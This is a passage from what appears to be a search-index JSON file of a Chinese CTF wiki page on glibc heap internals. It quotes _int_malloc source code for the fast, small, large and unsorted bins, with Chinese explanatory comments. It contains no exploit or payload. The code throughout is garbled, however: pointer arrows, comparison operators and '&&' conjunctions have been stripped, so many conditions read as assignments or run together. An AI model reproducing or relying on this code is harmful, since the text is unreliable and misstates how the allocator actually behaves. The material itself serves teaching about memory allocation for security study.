 unsigned   long   remainder_size ;   /* its size */ \n\n     unsigned   int   block ;   /* bit map traverser */ \n     unsigned   int   bit ;     /* bit map traverser */ \n     unsigned   int   map ;     /* current word of binmap */ \n\n     mchunkptr   fwd ;   /* misc temp for linking */ \n     mchunkptr   bck ;   /* misc temp for linking */ \n\n     const   char   * errstr   =   NULL ; \n\n     /*         Convert request size to internal form by adding SIZE_SZ bytes         overhead plus possibly more to obtain necessary alignment and/or         to obtain a size of at least MINSIZE, the smallest allocatable         size. Also, checked_request2size traps (returning 0) request sizes         that are so large that they wrap around zero when padded and         aligned.       */ \n\n     checked_request2size ( bytes ,   nb );", 
            "title": "_int_malloc"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#arena", 
            "text": "/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from         mmap.  */ \n     if   ( __glibc_unlikely ( av   ==   NULL ))   { \n         void   * p   =   sysmalloc ( nb ,   av ); \n         if   ( p   !=   NULL )   alloc_perturb ( p ,   bytes ); \n         return   p ; \n     }", 
            "title": "arena"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#fast-bin", 
            "text": "\u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c \u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570 \u3002 \u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk \u3002       /*         If the size qualifies as a fastbin, first check corresponding bin.         This code is safe to execute even if av is not yet initialized, so we         can try it without checking, which saves some time on this fast path.       */ \n\n     if   (( unsigned   long )   ( nb )   =   ( unsigned   long )   ( get_max_fast ()))   { \n         // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807 \n         idx               =   fastbin_index ( nb ); \n         // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488 \n         mfastbinptr   * fb   =   fastbin ( av ,   idx ); \n         mchunkptr      pp   =   * fb ; \n         // \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c \n         do   { \n             victim   =   pp ; \n             if   ( victim   ==   NULL )   break ; \n         }   while   (( pp   =   catomic_compare_and_exchange_val_acq ( fb ,   victim - fd , \n                                                             victim ))   !=   victim ); \n         // \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk \n         if   ( victim   !=   0 )   { \n             // \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002 \n             // \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002 \n             // \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002 \n             if   ( __builtin_expect ( fastbin_index ( chunksize ( victim ))   !=   idx ,   0 ))   { \n                 errstr   =   malloc(): memory corruption (fast) ; \n             errout : \n                 malloc_printerr ( check_action ,   errstr ,   chunk2mem ( victim ),   av ); \n                 return   NULL ; \n             } \n             // \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528 \n             check_remalloced_chunk ( av ,   victim ,   nb ); \n             // \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f \n             void   * p   =   chunk2mem ( victim ); \n             // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n             alloc_perturb ( p ,   bytes ); \n             return   p ; \n         } \n     }", 
            "title": "fast bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#small-bin", 
            "text": "\u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b       /*         If a small request, check regular bin.  Since these  smallbins         hold one size each, no searching within bins is necessary.         (For a large request, we need to wait until unsorted chunks are         processed to find best fit. But for small ones, fits are exact         anyway, so we can check now, which is faster.)       */ \n\n     if   ( in_smallbin_range ( nb ))   { \n         // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 \n         idx   =   smallbin_index ( nb ); \n         // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 \n         bin   =   bin_at ( av ,   idx ); \n         // \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \n         // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 \n         // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 \n         if   (( victim   =   last ( bin ))   !=   bin )   { \n             // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 \n             if   ( victim   ==   0 )   /* initialization check */ \n                 // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 \n                 malloc_consolidate ( av ); \n             // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk \n             else   { \n                 // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 \n                 bck   =   victim - bk ; \n                 // \u68c0\u67e5 bck- fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 \n                 if   ( __glibc_unlikely ( bck - fd   !=   victim ))   { \n                     errstr   =   malloc(): smallbin double linked list corrupted ; \n                     goto   errout ; \n                 } \n                 // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d \n                 set_inuse_bit_at_offset ( victim ,   nb ); \n                 // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 \n                 bin - bk   =   bck ; \n                 bck - fd   =   bin ; \n                 // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 \n                 if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             } \n         } \n     }", 
            "title": "small bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#large-bin", 
            "text": "\u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684chunk\uff0c\u800c\u662f\u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1malloc_state\u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d\uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662fptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002       /*         If this is a large request, consolidate fastbins before continuing.         While it might look excessive to kill all fastbins before         even seeing if there is space available, this avoids         fragmentation problems normally associated with fastbins.         Also, in practice, programs tend to have runs of either small or         large requests, but less often mixtures, so consolidation is not         invoked all that often in most programs. And the programs that         it is called frequently in otherwise tend to fragment.       */ \n\n     else   { \n         // \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002 \n         idx   =   largebin_index ( nb ); \n         // \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin  \n         if   ( have_fastchunks ( av ))   malloc_consolidate ( av ); \n     }", 
            "title": "large bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_7", 
            "text": "\u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk\u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662flarge chunk  \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406 \u3002  \u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c   \u5c1d\u8bd5\u4ece unsorted bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58  \u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58  \u5c1d\u8bd5\u4ece top  chunk \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u5185\u5b58   \u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914dsmall bin chunk\u3002       /*         Process recently freed or remaindered chunks, taking one only if         it is exact fit, or, if this a small request, the chunk is remainder from         the most recent non-exact fit.  Place other traversed chunks in         bins.  Note that this step is the only place in any routine where         chunks are placed in bins.         The outer loop here is needed because we might not realize until         near the end of malloc that we should have consolidated, so must         do so and retry. This happens at most once, and only when we would         otherwise need to expand memory to service a  small  request.       */ \n\n     for   (;;)   { \n         int   iters   =   0 ;", 
            "title": "\u5927\u5faa\u73af"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#unsort-bin", 
            "text": "\u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8e small bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002  \u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002           // \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a \n         // First In First Out \n         while   (( victim   =   unsorted_chunks ( av ) - bk )   !=   unsorted_chunks ( av ))   { \n             // victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \n             // bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \n             bck   =   victim - bk ; \n             // \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927 \n             // \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K \n             if   ( __builtin_expect ( chunksize_nomask ( victim )   =   2   *   SIZE_SZ ,   0 )   || \n                 __builtin_expect ( chunksize_nomask ( victim )     av - system_mem ,   0 )) \n                 malloc_printerr ( check_action ,   malloc(): memory corruption , \n                                 chunk2mem ( victim ),   av ); \n             // \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002 \n             size   =   chunksize ( victim );", 
            "title": "unsort bin \u904d\u5386"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#small-request", 
            "text": "\u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk\uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u591f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c \u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7 \uff1f               /*                 If a small request, try to use last remainder if it is the                 only chunk in unsorted bin.  This helps promote locality for                 runs of consecutive small requests. This is the only                 exception to best-fit, and applies only when there is                 no exact fit for a small chunk.               */ \n\n             if   ( in_smallbin_range ( nb )     bck   ==   unsorted_chunks ( av )   \n                 victim   ==   av - last_remainder   \n                 ( unsigned   long )   ( size )     ( unsigned   long )   ( nb   +   MINSIZE ))   { \n                 /* split and reattach remainder */ \n                 // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f \n                 remainder_size            =   size   -   nb ; \n                 // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e \n                 remainder                 =   chunk_at_offset ( victim ,   nb ); \n                 // \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5 \n                 unsorted_chunks ( av ) - bk   =   unsorted_chunks ( av ) - fd   =   remainder ; \n                 // \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder \n                 av - last_remainder                                  =   remainder ; \n                 // \u66f4\u65b0last remainder\u7684\u6307\u9488 \n                 remainder - bk   =   remainder - fd   =   unsorted_chunks ( av ); \n                 if   ( ! in_smallbin_range ( remainder_size ))   { \n                     remainder - fd_nextsize   =   NULL ; \n                     remainder - bk_nextsize   =   NULL ; \n                 } \n                 // \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0c \n                 set_head ( victim ,   nb   |   PREV_INUSE   | \n                                      ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 )); \n                 // \u8bbe\u7f6e remainder \u7684\u5934\u90e8 \n                 set_head ( remainder ,   remainder_size   |   PREV_INUSE ); \n                 // \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002 \n                 set_foot ( remainder ,   remainder_size ); \n                 // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             }", 
            "title": "small request"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_8", 
            "text": "/* remove from unsorted list */ \n             unsorted_chunks ( av ) - bk   =   bck ; \n             bck - fd                   =   unsorted_chunks ( av );", 
            "title": "\u521d\u59cb\u53d6\u51fa"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#exact-fit", 
            "text": "\u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002               /* Take now instead of binning if exact fit */ \n             if   ( size   ==   nb )   { \n                 set_inuse_bit_at_offset ( victim ,   size ); \n                 if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 void   * p   =   chunk2mem ( victim ); \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             }", 
            "title": "exact fit"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#place-chunk-in-small-bin", 
            "text": "\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002               /* place chunk in bin */ \n\n             if   ( in_smallbin_range ( size ))   { \n                 victim_index   =   smallbin_index ( size ); \n                 bck            =   bin_at ( av ,   victim_index ); \n                 fwd            =   bck - fd ;", 
            "title": "place chunk in small bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#place-chunk-in-large-bin", 
            "text": "\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002               }   else   { \n                 // large bin\u8303\u56f4 \n                 victim_index   =   largebin_index ( size ); \n                 bck            =   bin_at ( av ,   victim_index ); \n                 fwd            =   bck - fd ; \n\n                 /* maintain large bins in sorted order */ \n                 /* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002                     \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c                     \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c                     \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/ \n                 // \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a \n                 if   ( fwd   !=   bck )   { \n                     /* Or with inuse bit to speed comparisons */ \n                     // \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684chunk\u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002 \n                     size   |=   PREV_INUSE ; \n                     /* if smaller than smallest, bypass loop below */ \n                     // bck-bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002 \n                     // \u5982\u679c\u904d\u5386\u7684 chunk \u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002 \n                     // \u5224\u65ad bck- bk \u662f\u4e0d\u662f\u5728 main arena\u3002 \n                     assert ( chunk_main_arena ( bck - bk )); \n                     if   (( unsigned   long )   ( size )   \n                         ( unsigned   long )   chunksize_nomask ( bck - bk ))   { \n                         // \u4ee4 fwd \u6307\u5411 bin \u5934 \n                         fwd   =   bck ; \n                         // \u4ee4 bck \u6307\u5411 bin \u5c3e \n                         bck   =   bck - bk ; \n                         // victim \u7684 fd_nextsize \u6307\u5411\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \n                         victim - fd_nextsize   =   fwd - fd ; \n                         // victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2achunk \u6307\u5411\u7684bk_nextsize \n                         victim - bk_nextsize   =   fwd - fd - bk_nextsize ; \n                         // \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim \n                         // \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim \n                         fwd - fd - bk_nextsize   = \n                             victim - bk_nextsize - fd_nextsize   =   victim ; \n                     }   else   { \n                         // \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk  \n                         // \u5224\u65ad fwd \u662f\u5426\u5728 main arena \n                         assert ( chunk_main_arena ( fwd )); \n                         // \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk \n                         while   (( unsigned   long )   size     chunksize_nomask ( fwd ))   { \n                             fwd   =   fwd - fd_nextsize ; \n                             assert ( chunk_main_arena ( fwd )); \n                         } \n                         // \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c \n                         // \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002 \n                         if   (( unsigned   long )   size   == \n                             ( unsigned   long )   chunksize_nomask ( fwd )) \n                             /* Always insert in the second position.  */ \n                             fwd   =   fwd - fd ; \n                         else   { \n                             // \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837 \n                             // \u90a3\u4e48\u5c31\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86 \n                             victim - fd_nextsize                =   fwd ; \n                             victim - bk_nextsize                =   fwd - bk_nextsize ; \n                             fwd - bk_nextsize                   =   victim ; \n                             victim - bk_nextsize - fd_nextsize   =   victim ; \n                         } \n                         bck   =   fwd - bk ; \n                     } \n                 }   else \n                     // \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002 \n                     victim - fd_nextsize   =   victim - bk_nextsize   =   victim ; \n             }", 
            "title": "place chunk in large bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_9", 
            "text": "// \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bk -- victim -- fwd\u3002 \n             mark_bin ( av ,   victim_index ); \n             victim - bk   =   bck ; \n             victim - fd   =   fwd ; \n             fwd - bk      =   victim ; \n             bck - fd      =   victim ;", 
            "title": "\u6700\u7ec8\u53d6\u51fa"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#while", 
            "text": "while \u6700\u591a\u8fed\u4ee310000\u6b21\u540e\u9000\u51fa\u3002               //   ##define MAX_ITERS 10000 \n             if   ( ++ iters   =   MAX_ITERS )   break ; \n         }", 
            "title": "while \u8fed\u4ee3\u6b21\u6570"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#large-chunk", 
            "text": "\u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3asmall bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684chunk\u3002  \u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002           /*             If a large request, scan through the chunks of current bin in             sorted order to find smallest that fits.  Use the skip list for this.           */ \n         if   ( ! in_smallbin_range ( nb ))   { \n             bin   =   bin_at ( av ,   idx ); \n             /* skip scan if empty or largest chunk is too small */ \n             // \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7 \n             // first(bin)=bin- fd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk \n             if   (( victim   =   first ( bin ))   !=   bin   \n                 ( unsigned   long )   chunksize_nomask ( victim )   = \n                     ( unsigned   long )   ( nb ))   { \n                 // \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk \n                 victim   =   victim - bk_nextsize ; \n                 while   ((( unsigned   long )   ( size   =   chunksize ( victim ))   \n                         ( unsigned   long )   ( nb ))) \n                     victim   =   victim - bk_nextsize ; \n\n                 /* Avoid removing the first entry for a size so that the skip                     list does not have to be rerouted.  */ \n                 // \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk \n                 // \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize \n                 //  \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002 \n                 if   ( victim   !=   last ( bin )   \n                     chunksize_nomask ( victim )   ==   chunksize_nomask ( victim - fd )) \n                     victim   =   victim - fd ; \n                 // \u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f \n                 remainder_size   =   size   -   nb ; \n                 // \u8fdb\u884cunlink \n                 unlink ( av ,   victim ,   bck ,   fwd ); \n\n                 /* Exhaust */ \n                 // \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757 \n                 // 